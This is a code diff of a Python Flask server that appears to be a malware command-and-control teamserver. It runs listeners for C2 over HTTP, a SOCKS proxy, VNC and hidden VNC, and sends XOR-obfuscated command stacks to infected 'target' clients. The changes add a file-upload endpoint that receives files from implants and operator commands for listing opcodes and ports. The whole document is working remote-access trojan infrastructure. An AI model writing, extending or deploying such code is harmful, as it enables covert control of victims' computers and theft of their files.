@@ -11,19 +11,22 @@ app2 = Flask(__name__)
 from requests.structures import CaseInsensitiveDict
 import requests, struct
 from io import BytesIO
+from werkzeug.utils import secure_filename
 
 stacks = {}
 outs = {}
 living = {}
 allout = ""
 SOCKS_SECRET = "VERYSECRET1337"
-HTTP_C2_PORT = 1234
-SOCKS_PORT = 6968
-TEAMSERV_PORT = 6942
-VNC_PORT = 1235
-HVNC_PORT = 1236
-INT_PROX_PORT = 42069
-EXT_PROX_PORT = 42068
+ports = {}
+ports["HTTP_C2_PORT"] = 1234
+ports["SOCKS_PORT"] = 6968
+ports["TEAMSERV_PORT"] = 6942
+ports["VNC_PORT"] = 1235
+ports["HVNC_PORT"] = 1236
+ports["INT_PROX_PORT"] = 42069
+ports["EXT_PROX_PORT"] = 42068
+DL_FOLDER = "folder"
 f = open("commands_enum.h", "r")
 opcodes = "\n".join(f.read().split("\n")[1:-1])
 f.close()
@@ -170,26 +173,34 @@ def closehvnc():
         return "Connection closed successfully!"
     return "Connection not closed"
 def vncth():
-    global vncs, VNC_PORT
+    global vncs, ports
     HOST = "0.0.0.0"
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind((HOST, VNC_PORT))
+    s.bind((HOST, ports["VNC_PORT"]))
     s.listen()
     while True:
         conn, addr = s.accept()
         vncs[str(addr[1])] = conn
 def hvncth():
-    global hvncs, HVNC_PORT
+    global hvncs, ports
     HOST = "0.0.0.0"
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind((HOST, HVNC_PORT))
+    s.bind((HOST, ports["HVNC_PORT"]))
     s.listen()
     while True:
         conn, addr = s.accept()
         hvncs[str(addr[1])] = conn
-
+@app.route('/upload', methods=['POST'])
+def upload_file():
+    if request.method == 'POST':
+        fil = request.files['file']
+        filename = secure_filename(fil.filename)
+        print("RECEIVED FILE:", filename)
+        fil.save(os.path.join(DL_FOLDER, filename))
+        return "ok"
+    return ""
 @app.route("/document/<uid>" , methods=['GET'])
 def command(uid):
     global stacks, allout, outs
@@ -238,10 +249,10 @@ def pipe(fr, to):
             break
 proxied = False
 def proxylord():
-    global INT_PROX_PORT, EXT_PROX_PORT, proxied
+    global ports, proxied
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind(("0.0.0.0", EXT_PROX_PORT)) #transmission
+    s.bind(("0.0.0.0", ports["EXT_PROX_PORT"])) #transmission
     s.listen()
     while True:
         proxied = False
@@ -249,7 +260,7 @@ def proxylord():
         proxied = True
         s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        s2.bind(("127.0.0.1", INT_PROX_PORT))
+        s2.bind(("127.0.0.1", ports["INT_PROX_PORT"]))
         s2.listen()
         while True:
             cli, _ = s2.accept()
@@ -306,7 +317,7 @@ def sockhand(conn, addr):
 
 def sockserv():
     HOST = "0.0.0.0"
-    PORT = SOCKS_PORT
+    PORT = ports["SOCKS_PORT"]
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.bind((HOST, PORT))
@@ -318,7 +329,7 @@ def sockserv():
 
 
 def httpserv():
-    serve(app, host="0.0.0.0", port=HTTP_C2_PORT)
+    serve(app, host="0.0.0.0", port=ports["HTTP_C2_PORT"])
     
 @app2.route("/recv" , methods=['GET'])
 def allo():
@@ -344,21 +355,24 @@ def index():
     return r
 
 @app2.route("/opcodes" , methods=['GET'])
-def lopcodes():
+def lopcodes(codes = None):
     global data
     a = []
     for x in data:
+        if codes != None:
+            if not codes.upper() in x:
+                continue
         s = x+" ("+str(data[x][2])+" args)"
         if data[x][1]:
             s+=" (returns string)"
         if len(data[x])>3:
             s+=" "+data[x][3]
         a.append(s)
-    return json.dumps(a)
+    return "\n".join(a)
 
 @app2.route("/sendcmd" , methods=['GET'])
 def cmdsend():
-    global data, stacks, living, c2table
+    global data, stacks, living, c2table, allout, ports
     if not ("data" in request.args and "target" in request.args):   
         return "error: invalid request\n"
     
@@ -372,6 +386,21 @@ def cmdsend():
         return "error: client not online\n"
     else:
         stacks[request.args["target"]] = pack(random.randint(1, 2**32-1))+xor(construct(stack[0]))
+    for x in stack[2]:
+        datum = "\n"
+        cmd = x[0].upper()
+        if cmd == "HELP":
+            if len(x) == 1:
+                datum += lopcodes()
+            if len(x) == 2:
+                datum += lopcodes(codes = x[1])
+            allout += datum.replace("\n", "\n"+gettime()+" [SERVER]: ")
+        elif cmd == "CLS":
+            allout = ""
+        elif cmd == "GETPORTS":
+            for x in ports:
+                datum+="["+x+"] - "+str(ports[x])+"\n"
+            allout += datum.replace("\n", "\n"+gettime()+" [SERVER]: ")
     return "ok\n"
 threading.Thread(target=livers).start()
 killthread.Thread(target=sockserv).start()
@@ -379,4 +408,4 @@ killthread.Thread(target=httpserv).start()
 killthread.Thread(target=vncth).start()
 killthread.Thread(target=hvncth).start()
 killthread.Thread(target=proxylord).start()
-serve(app2, host="127.0.0.1", port=TEAMSERV_PORT)
+serve(app2, host="127.0.0.1", port=ports["TEAMSERV_PORT"])
